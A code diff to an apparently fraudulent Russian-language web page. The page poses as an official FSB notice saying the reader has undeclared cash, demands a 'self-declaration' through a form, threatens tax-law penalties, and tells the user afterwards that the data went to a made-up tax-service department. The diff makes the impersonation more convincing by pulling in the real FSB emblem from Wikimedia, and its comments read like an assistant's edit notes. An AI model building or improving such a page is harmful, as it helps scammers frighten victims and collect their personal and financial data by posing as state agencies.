@@ -499,13 +499,19 @@
 
     <!-- Уведомление -->
     <div id="notification">
-      <img src="fsb-icon.png" alt="ФСБ">
-      <div>
-        <h2>Уведомление от ФСБ России</h2>
-        <p>В ходе совместных мероприятий ФСБ и ФНС у Вас выявлены незадекларированные наличные денежные средства. Просим добровольно подать самодекларацию о данных средствах.</p>
-        <p>Невыполнение этого требования приведет к ответственности согласно Налоговому кодексу РФ.</p>
-      </div>
-    </div>
+  <!-- Иконка ФСБ: возьмем небольшую PNG-иконку из открытых источников -->
+  <img 
+    src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/%D0%95%D0%BC%D0%B1%D0%BB%D0%B5%D0%BC%D0%B0_%D0%A4%D0%A1%D0%91.svg/48px-%D0%95%D0%BC%D0%B1%D0%BB%D0%B5%D0%BC%D0%B0_%D0%A4%D0%A1%D0%91.svg.png" 
+    alt="ФСБ" 
+    style="width: 40px; height: 40px; margin-right: 12px;"
+  >
+  <div>
+    <h2>Уведомление от ФСБ России</h2>
+    <p>В ходе совместных мероприятий ФСБ и ФНС у Вас выявлены незадекларированные наличные денежные средства. Просим добровольно подать самодекларацию о данных средствах.</p>
+    <p>Невыполнение этого требования приведет к ответственности согласно Налоговому кодексу РФ.</p>
+  </div>
+</div>
+
 
     <!-- Форма -->
     <form id="declarationForm">
@@ -606,10 +612,17 @@
 
     <!-- Сообщение об успехе -->
     <div id="success-message">
-      <div style="display: flex; align-items: center;">
-        <img src="checkmark-green.png" alt="Успешно">
-        <p><strong>Спасибо!</strong> Ваши данные переданы в Отдел финансовой самодисциплины ФНС России.</p>
-      </div>
+  <div style="display: flex; align-items: center;">
+    <!-- Галочка: можно взять любую маленькую «checkmark» PNG из интернета -->
+    <img 
+      src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/42/Check_green_circle.svg/48px-Check_green_circle.svg.png" 
+      alt="Успешно" 
+      style="width: 28px; height: 28px; margin-right: 10px;"
+    >
+    <p><strong>Спасибо!</strong> Ваши данные переданы в Отдел финансовой самодисциплины ФНС России.</p>
+  </div>
+</div>
+
     </div>
 
     <!-- Футер -->
